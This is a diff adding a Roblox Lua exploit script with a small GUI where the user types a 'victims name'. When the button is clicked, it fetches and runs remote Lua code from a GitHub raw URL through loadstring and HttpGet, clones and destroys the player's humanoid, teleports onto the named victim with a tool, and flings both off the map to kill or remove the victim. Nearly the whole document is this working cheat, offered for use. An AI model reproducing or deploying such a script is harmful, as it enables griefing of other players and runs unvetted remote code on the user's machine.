@@ -1,0 +1,90 @@
+-- script by h3x0r / gui by Duky
+-- Instances:
+
+local Main = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local VictimName = Instance.new("TextBox")
+local Enter = Instance.new("TextButton")
+
+--Properties:
+
+Main.Name = "Main"
+Main.Parent = game.CoreGui
+Main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = Main
+MainFrame.Active = true
+MainFrame.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
+MainFrame.BorderSizePixel = 0
+MainFrame.Position = UDim2.new(0.211907163, 0, 0.369565219, 0)
+MainFrame.Size = UDim2.new(0, 188, 0, 48)
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+VictimName.Name = "VictimName"
+VictimName.Parent = MainFrame
+VictimName.BackgroundColor3 = Color3.fromRGB(170, 170, 255)
+VictimName.BorderSizePixel = 0
+VictimName.Position = UDim2.new(0.0478723422, 0, 0.125, 0)
+VictimName.Size = UDim2.new(0, 89, 0, 36)
+VictimName.Font = Enum.Font.SourceSans
+VictimName.Text = "victims name"
+VictimName.TextColor3 = Color3.fromRGB(0, 0, 0)
+VictimName.TextScaled = true
+VictimName.TextSize = 14.000
+VictimName.TextWrapped = true
+
+Enter.Name = "Enter"
+Enter.Parent = MainFrame
+Enter.BackgroundColor3 = Color3.fromRGB(255, 170, 255)
+Enter.BorderSizePixel = 0
+Enter.Position = UDim2.new(0.641691685, 0, 0.1875, 0)
+Enter.Size = UDim2.new(0, 53, 0, 30)
+Enter.Font = Enum.Font.SourceSans
+Enter.Text = "Enter"
+Enter.TextColor3 = Color3.fromRGB(0, 0, 0)
+Enter.TextSize = 14.000
+
+--Script
+Enter.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OpenGamerTips/TextBin/master/primary_ownership_isnt_patched.lua"))()
+local RunService = game:GetService("RunService")
+local Player = game:GetService("Players").LocalPlayer
+local Character = Player.Character
+local Humanoid = Character.Humanoid
+local Saved = Character.HumanoidRootPart.CFrame
+
+local Victim = game.Players[VictimName.Text].Character 
+local Tool = Player.Backpack:FindFirstChildWhichIsA("Tool")
+
+Humanoid.Name = "_Humanoid"
+local FakeHumanoid = Humanoid:Clone()
+FakeHumanoid.Parent = Character
+FakeHumanoid.Name = "Humanoid"
+wait(0.1)
+Humanoid:Destroy()
+Character.Animate.Disabled = true
+
+workspace.CurrentCamera.CameraSubject = Character
+FakeHumanoid.DisplayDistanceType = "None"
+wait(0.1)
+
+Tool.Parent = Character
+Character.HumanoidRootPart.CFrame = Victim.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0) * CFrame.new(math.random(-50, 50) / 200, math.random(-50, 50) / 200, math.random(-50, 50) / 200)
+for i = 1, 5 do
+    wait(0.2)
+    Character.HumanoidRootPart.CFrame = Victim.HumanoidRootPart.CFrame
+end
+
+local count = 0
+while wait(0.2) do
+    count = count + 1
+    if count == 5 then Character:FindFirstChild("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead) end
+    
+    local did = pcall(function()
+        Character.HumanoidRootPart.CFrame = CFrame.new(2048, 9e9, 2048)
+    end)
+    if not did then break end
+end
+end)
